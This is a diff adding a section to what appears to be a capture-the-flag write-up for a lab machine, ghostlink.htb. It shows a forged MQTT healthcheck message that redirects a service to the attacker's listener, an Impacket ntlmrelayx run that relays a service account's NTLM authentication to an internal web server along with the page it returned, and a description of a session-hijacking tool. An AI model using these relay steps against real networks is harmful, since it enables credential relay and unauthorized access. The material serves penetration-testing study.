@@ -402,6 +402,66 @@ img
 
 CVE-2025-8110 (RCE authenticated - Gravità Alta/Critica) 
 
+
+## More relaying
+
+```
+ mosquitto_pub -h ghostlink.htb -r -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
+  -m '{"timestamp":"2026-29-10-21:24:27","node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.148:8888/healthcheck","lastCheckSecAgo":42,"responseCode":"200","ip":"172.16.20.10"}}'
+```
+
+```
+python3 ntlmrelayx.py -t http://gpz-op26-secure.ghostlink.htb --http-port 8888 --keep-relaying
+
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client SMB loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 8888
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
+[*] (HTTP): Client requested path: /healthcheck
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
+DEFAULT CASE
+200 OK
+b'<!DOCTYPE html>\n<html lang="en">\n\n<head>\n    <meta charset="utf-8" />\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n    <meta name="description" content="Ghost Protocol Zero - Secure File Sharing" />\n    <base href="/" />\n    <link rel="stylesheet" href="lib/bootstrap/dist/css/bootstrap.min.css" />\n    <link rel="stylesheet" href="app.css" />\n    <link rel="icon" type="image/x-icon" href="favicon.png" />\n    <title>Ghost Protocol Zero | Secure Operations Channel</title>\n</head>\n\n<body>\n    <nav class="navbar">\n        <div class="nav-container">\n            <div class="nav-left">\n                <a href="/" class="nav-logo">\n                    <svg class="nav-logo-icon" width="33" height="33" viewBox="0 0 33 33" fill="none" xmlns="http://www.w3.org/2000/svg">\n                        <path d="M28 0H5C2.24 0 0 2.24 0 5v23c0 2.76 2.24 5 5 5h23c2.76 0 5-2.24 5-5V5c0-2.76-2.24-5-5-5ZM29 17c-6.63 0-12 5.37-12 12h-1c0-6.63-5.37-12-12-12v-1c6.63 0 12-5.37 12-12h1c0 6.63 5.37 12 12 12v1Z" fill="currentColor"/>\n                    </svg>\n                    <span class="nav-logo-text">Ghost Protocol Zero</span>\n                </a>\n            </div>\n            <div class="nav-right">\n                <a href="operation-briefing.pdf" download class="btn btn-primary">Latest Operation Briefing</a>\n            </div>\n        </div>\n    </nav>\n\n    <section class="hero-section">\n        <div class="container">\n            <div class="hero-grid">\n                <div class="hero-content">\n                    <h1 class="hero-heading">Influence comes from control.</h1>\n                    <p class="hero-subheading">Ghost Protocol Zero communications through classified channels. Task Force Nightfall is frequently deploying mass surveillance, our operational security is now of utmost importance. All uploads will be stored for 24hrs and encrypted at rest using the team leader\'s public key.</p>\n                    <button class="btn btn-primary btn-upload" id="toggleUploadBtn">\n                        Upload\n                    </button>\n                    \n                    <div id="uploadMessage" class="upload-message" style="display: none;"></div>\n                    \n                    <div id="shareLinkContainer" class="share-link-container" style="display: none;">\n                        <p class="share-label">Classified channel:</p>\n                        <div class="share-link-box">\n                            <input type="text" readonly id="shareLinkInput" class="share-link-input" />\n                            <button class="btn btn-copy" id="copyLinkBtn">Copy</button>\n                        </div>\n                    </div>\n                </div>\n                <div class="hero-image-wrapper">\n                    <div class="upload-zone-overlay" id="uploadZoneOverlay" style="display: none;">\n                        <div class="upload-zone">\n                            <div class="upload-zone-content">\n                                <svg class="upload-icon" width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">\n                                    <path d="M12 16V4M12 4L8 8M12 4L16 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>\n                                    <path d="M4 14V18C4 19.1046 4.89543 20 6 20H18C19.1046 20 20 19.1046 20 18V14" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>\n                                </svg>\n                                <p class="upload-text">Drop classified intelligence here</p>\n                                <p class="upload-hint">Max file size: 5MB // No traceback</p>\n                                <input type="file" id="fileInput" multiple style="display: none;" />\n                                <label for="fileInput" class="btn btn-upload-browse">Browse Assets</label>\n                            </div>\n                        </div>\n                        \n                        <div id="selectedFilesList" class="selected-files-list" style="display: none;"></div>\n                    </div>\n                    <img src="images/hero-image.avif" \n                         alt="Team brainstorming in an office" \n                         class="hero-image" \n                         loading="lazy" />\n                    <div class="hero-overlay"></div>\n                </div>\n            </div>\n        </div>\n    </section>\n\n    <section class="features-section">\n        <div class="container">\n            <div class="features-header">\n                <h2 class="features-heading">Operational Security</h2>\n                <p class="features-subheading">Our objective is long-term access and credibility, our communications must remain invisible.</p>\n            </div>\n            <div class="features-grid">\n                <div class="feature-card">\n                    <div class="feature-front">\n                        <div class="feature-content">\n                            <span class="feature-eyebrow">Zero traceback</span>\n                            <h3 class="feature-title">No accounts. No logs. No identity.</h3>\n                        </div>\n                    </div>\n                    <div class="feature-back">\n                        <img src="images/feature-1.avif" \n                             alt="Software security protocols" \n                             class="feature-image" \n                             loading="lazy" />\n                    </div>\n                </div>\n                <div class="feature-card">\n                    <div class="feature-front">\n                        <div class="feature-content">\n                            <span class="feature-eyebrow">End-to-end encrypted</span>\n                            <h3 class="feature-title">Classified channels only</h3>\n                        </div>\n                    </div>\n                    <div class="feature-back">\n                        <img src="images/feature-2.avif" \n                             alt="Cloud-based solutions interface" \n                             class="feature-image" \n                             loading="lazy" />\n                    </div>\n                </div>\n                <div class="feature-card">\n                    <div class="feature-front">\n                        <div class="feature-content">\n                            <span class="feature-eyebrow">One-time links</span>\n                            <h3 class="feature-title">Ephemeral access. No persistent exposure.</h3>\n                        </div>\n                    </div>\n                    <div class="feature-back">\n                        <img src="images/feature-3.avif" \n                             alt="Satellite communication service" \n                             class="feature-image" \n                             loading="lazy" />\n                    </div>\n                </div>\n            </div>\n        </div>\n    </section>\n\n    <script src="app.js"></script>\n</body>\n\n</html>\n'
+^C                                                                                                                    
+
+```
+
+#### ghostsurf
+
+[ghostsurf](https://github.com/senderend/ghostsurf) is a tool from SpecterOps used for this kind of relay hijack, describing itself as:
+
+> NTLM HTTP relay tool with SOCKS proxy for browser session hijacking.
+> 
+> Capture NTLM auth, relay to HTTP/HTTPS targets, then browse as the victim through a SOCKS proxy. This works even when cookie replay doesn’t.
+> 
+> Blog: [ghostsurf: From NTLM Relay to Browser Session Hijacking](https://specterops.io/blog/2026/04/02/ghostsurf-from-ntlm-relay-to-browser-session-hijacking/)
+
+
 ---
 ## Foothold
 
